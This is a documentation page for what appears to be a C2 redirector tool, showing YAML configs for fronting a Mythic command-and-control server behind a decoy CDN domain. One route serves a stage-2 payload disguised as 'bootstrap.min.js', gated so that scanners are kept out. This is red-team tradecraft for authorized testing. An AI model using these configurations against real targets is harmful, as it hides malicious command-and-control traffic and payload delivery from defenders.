---
layout: default
title: Mythic
parent: C2 Frameworks
grand_parent: Frameworks
nav_order: 2
---

# Mythic

Supports Mythic's HTTPX and HTTP agents. Profile JSON from the Mythic agent builder is parsed to extract URI patterns and headers.

## Config

```yaml
domains:
  cdn.example.com:
    upstream: "https://${MYTHIC_IP}:7443"
    profile_path: "profiles/mythic-httpx.json"
    profile_type: "mythic"
    ssl_verify: false

    drop_action:
      type: "redirect"
      target: "https://cdn.jsdelivr.net"
```

See `config/examples/c2-mythic.yaml`.

## Payload Delivery via Mythic File Store

```yaml
content_routes:
  - path: "/assets/bootstrap.min.js"
    backend:
      type: "mythic_file"
      target: "https://${MYTHIC_IP}:7443"
      file_id: "${MYTHIC_STAGE2_FILE_ID}"
      ssl_verify: false
    guard:
      require_beacon_ip: true
      forbidden_headers: ["Via", "X-Forwarded-For"]
    require_token: true
    rate_limit:
      enabled: true
      max_downloads: 1
      window_seconds: 3600
```

InfraGuard fetches `/direct/download/<file_id>` from the Mythic server.

### Dynamic UUID Proxy

```yaml
  - path: "/dl/*"
    backend:
      type: "mythic_file"
      target: "https://${MYTHIC_IP}:7443"
      ssl_verify: false   # no file_id — UUID taken from path
    guard:
      require_beacon_ip: true
```

## Port Reference

| Service | Default Port |
|---|---|
| Mythic web UI | 7443 |
| File download endpoint | 7443 `/direct/download/<uuid>` |
